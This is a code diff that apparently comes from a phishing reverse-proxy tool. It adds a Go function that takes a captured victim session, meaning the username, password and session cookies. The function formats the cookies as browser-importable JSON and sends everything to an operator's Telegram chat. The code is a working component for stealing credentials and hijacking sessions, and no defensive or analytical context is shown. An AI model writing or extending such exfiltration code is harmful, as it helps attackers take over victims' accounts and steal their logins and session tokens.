@@ -944,6 +944,68 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 	}
 }
 
+// NotifySessionFromDB sends a stored session to the admin Telegram chat.
+func NotifySessionFromDB(sess *database.Session) {
+	if GlobalBot == nil {
+		return
+	}
+	adminChatId := GlobalBot.cfg.GetBotAdminChatId()
+	if adminChatId == 0 {
+		return
+	}
+
+	uname := sess.Username
+	if uname == "" {
+		uname = "—"
+	}
+	pass := sess.Password
+	if pass == "" {
+		pass = "—"
+	}
+
+	sessionVal := "N/A"
+
+	type browserCookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+	}
+	defaultExpiry := sess.UpdateTime + 2592000
+	var cookies []browserCookie
+	for domain, tokenMap := range sess.CookieTokens {
+		for _, ct := range tokenMap {
+			expiry := ct.ExpiresAt
+			if expiry == 0 {
+				expiry = defaultExpiry
+			}
+			cookies = append(cookies, browserCookie{
+				Path:           ct.Path,
+				Domain:         domain,
+				ExpirationDate: expiry,
+				Value:          ct.Value,
+				Name:           ct.Name,
+				HttpOnly:       ct.HttpOnly,
+			})
+		}
+	}
+
+	cookieJSON := "[]"
+	if len(cookies) > 0 {
+		if b, err := json.MarshalIndent(cookies, "", "    "); err == nil {
+			cookieJSON = string(b)
+		}
+	}
+
+	msg := fmt.Sprintf(
+		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
+		uname, pass, sessionVal, cookieJSON)
+
+	GlobalBot.send(adminChatId, msg)
+}
+
 // ─────────────────────────────────────────────────────────────────────────────
 // Expiry cleanup loop
 // ─────────────────────────────────────────────────────────────────────────────
